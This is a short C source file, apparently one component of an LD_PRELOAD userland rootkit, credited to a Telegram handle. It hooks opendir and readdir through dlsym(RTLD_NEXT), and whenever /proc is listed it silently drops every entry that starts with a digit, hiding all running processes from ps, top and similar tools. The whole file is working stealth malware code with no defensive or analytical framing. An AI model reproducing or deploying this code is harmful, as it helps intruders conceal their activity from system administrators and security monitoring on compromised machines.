// by juan @ipmiv2 on telegram

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <ctype.h>

#include "headers/util.h"

typedef struct dirent *(*orig_readdir_t)(DIR *dirp);
typedef DIR *(*orig_opendir_t)(const char *pathname);

static DIR *(*orig_opendir_func)(const char *) = NULL;
static DIR *tracked_dir = NULL;
static char tracked_dir_path[256] = {0};

DIR *opendir(const char *name) {
    if (!orig_opendir_func)
        orig_opendir_func = (orig_opendir_t)dlsym(RTLD_NEXT, "opendir");
    DIR *dir = orig_opendir_func(name);
    if (dir && name) {
        tracked_dir = dir;
        util_strcpy(tracked_dir_path, (char *)name);
    }
    return dir;
}

struct dirent *readdir(DIR *dirp) {
    orig_readdir_t orig_readdir = (orig_readdir_t)dlsym(RTLD_NEXT, "readdir");
    if (!orig_readdir) {
        perror("readdir");
        exit(1);
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        int hide = 0;
        if (dirp == tracked_dir && util_strcmp(tracked_dir_path, "/proc") == 0)
            hide = isdigit(entry->d_name[0]);
        if (hide) {
            continue;
        }
        return entry;
    }
    return NULL;
}

__attribute__((constructor)) void init(void) {
}
